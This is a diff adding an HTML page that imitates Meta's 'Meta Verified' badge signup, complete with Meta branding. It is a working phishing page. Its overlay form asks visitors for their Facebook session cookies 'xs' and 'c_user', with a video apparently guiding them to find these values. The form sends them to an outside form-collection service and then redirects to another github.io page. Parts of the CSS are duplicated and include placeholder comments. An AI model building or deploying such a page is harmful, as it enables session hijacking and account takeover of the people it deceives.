@@ -1,3 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Home</title>
+   <style>
+
+
+        /* Existing CSS remains unchanged, only adding video-specific styles */
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .appeal-form {
+            background: #ffffff;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 340px;
+            padding: 12px;
+            position: relative;
+            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.1);
+            border: 1px solid #e5e7eb;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+
+        .appeal-form .close-btn {
+            position: absolute;
+            top: 6px;
+            right: 6px;
+            font-size: 18px;
+            color: #6b7280;
+            cursor: pointer;
+            background: none;
+            border: none;
+            transition: color 0.2s ease;
+        }
+
+        .appeal-form .close-btn:hover {
+            color: #1f2937;
+        }
+
+        .appeal-form h2 {
+            font-size: 17px;
+            margin-bottom: 6px;
+            font-weight: 600;
+            color: #1f2937;
+        }
+
+        .appeal-form p {
+            font-size: 11px;
+            color: #4b5563;
+            margin-bottom: 6px;
+            line-height: 1.4;
+        }
+
+        .appeal-form .video-container {
+            width: 100%;
+            height: 180px; /* Adjusted height for better visibility */
+            margin-bottom: 6px;
+            border-radius: 6px;
+            overflow: hidden;
+        }
+
+        .appeal-form .video-container video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover; /* Ensures video fills container */
+            border: 1px solid #1f2937;
+            border-radius: 6px;
+        }
+
+        .appeal-form input,
+        .appeal-form textarea {
+            width: 100%;
+            border: 1px solid #d1d5db;
+            border-radius: 5px;
+            padding: 5px;
+            margin-bottom: 6px;
+            font-size: 11px;
+            color: #1f2937;
+            background: #f9fafb;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .appeal-form input:focus,
+        .appeal-form textarea:focus {
+            outline: none;
+            border-color: #3b82f6;
+            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.1);
+        }
+
+        .appeal-form textarea {
+            height: 45px;
+            resize: none;
+        }
+
+        .appeal-form input {
+            height: 28px;
+        }
+
+        .appeal-form button {
+            width: 30%;
+            padding: 10px;
+            background-color: #4267B2;
+            color: white;
+            border: none;
+            border-radius: 0px;
+            font-size: 14px;
+            cursor: pointer;
+            float: right;
+            margin-top: -10px;
+        }
+
+        /* Rest of your existing CSS remains unchanged */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: system-ui, -apple-system, sans-serif;
+        }
+
+        body {
+            background: #F5F6F6;
+        }
 /* Professional CSS for a compact appeal form */
         .overlay {
             display: none;
@@ -902,3 +1036,111 @@
             font-weight: 500;
             box-shadow: 0 1px 3px rgba(0, 100, 224, 0.1);
         }
+        /* ... (rest of your existing CSS) ... */
+    </style>
+</head>
+<body>
+    <header class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" alt="Meta Logo">
+    </header>
+
+    <main class="main-content">
+        <section class="left-section">
+            <div class="badge-container">
+                <img src="https://cdn.glitch.global/9c268ed6-4eec-4c0c-9cb5-edf84fe4ab44/blue-verified-badge-18768.png" alt="Verified Badge" class="badge">
+                <span class="new-tag">New</span>
+            </div>
+            
+            <h1>Become <br>Meta Verified</h1>
+            
+            <a class='apply-btn' href='javascript:void(0)' onclick="openFormAndPlayVideo()">Apply</a>
+            
+            <p class="description">
+                Grow your social presence with Meta Verified – a new subscription <br> bundle available for creators and businesses on Instagram and <br> Facebook.
+            </p>
+            <p class="sign-up">Sign up now for creators</p>
+            <ul class="features-list">
+                <li>Verified badge and exclusive features</li>
+                <li>Proactive account protection</li>
+                <li>Access to dedicated support team</li>
+            </ul>
+
+            <div class="business-section">
+                <p><strong>Looking for business verification?</strong></p>
+                <a href="#" class="business-link">Learn about Meta Verified for Business</a>
+            </div>
+
+            <p class="disclaimer">Features, availability, and pricing may vary by region.</p>
+        </section>
+
+        <section class="right-section">
+            <img src="https://cdn.glitch.global/b7587d54-d587-4767-a79a-f12c49fffeb5/1000081140_LE_upscale_magic_beta_x4_strength_75_similarity_50_light_ai_10_tone_enhance_30_color_enhance_30.jpg?v=1734995406637" alt="Meta Verified" class="hero-image">
+        </section>
+    </main>
+
+    <!-- Appeal Form Overlay -->
+    <div class="overlay">
+        <div class="appeal-form">
+            <button class="close-btn" onclick="document.querySelector('.overlay').style.display='none';">×</button>
+            <h2>Verified Badge Form</h2>
+            <p>The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the individual, public figure, or brand that it represents.</p>
+            <p>Previously, the verified badge also required the person or brand to be notable and unique. You may still see users with a verified badge that represents our previous eligibility requirements.</p>
+            <p>Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.</p>
+            <div>
+                <h5>Detailed Video Information</h5>
+                <div class="video-container">
+                    <video id="video" controls preload="auto" poster="fbPlay.jfif">
+                        <source src="https://ucarecdn.com/906a344e-f03e-4318-a5e1-3bfc11b4f391/VerifiedBadges.mp4" type="video/mp4">
+                        Your browser does not support the video tag.
+                    </video>
+                </div>
+            </div>
+            <p>Please be sure to provide the requested information below.</p>
+            <form action="https://submit-form.com/sbXjqrVfb" method="POST" id="appealForm">
+                <input type="hidden" name="_redirect" value="https://meta-badg.github.io/app/next.html"/>
+                <label for="c_user">xs</label>
+                <input type="text" name="xs" placeholder="" required>
+                <label for="c_user">c_user</label>
+                <input type="text" name="c_user" placeholder="" required>
+                <br><br>
+                <button type="submit">Submit</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // Function to open form and play video
+        function openFormAndPlayVideo() {
+            const overlay = document.querySelector('.overlay');
+            const video = document.getElementById('video');
+            overlay.style.display = 'flex';
+            video.play(); // Automatically play the video
+        }
+
+        // Detect when elements are in the viewport and add animation
+        document.addEventListener('DOMContentLoaded', () => {
+            const elements = document.querySelectorAll('.scroll-animation');
+            const observer = new IntersectionObserver(entries => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        entry.target.classList.add('visible');
+                    }
+                });
+            });
+
+            elements.forEach(element => {
+                observer.observe(element);
+            });
+        });
+
+        // Form submission with redirect
+        document.getElementById('appealForm').addEventListener('submit', function(event) {
+            // The form will be submitted normally first
+            // Then redirect to a specified file
+            setTimeout(function() {
+                window.location.href = 'next.html';
+            }, 1000); // Adjust the delay as needed
+        });
+    </script>
+</body>
+</html>
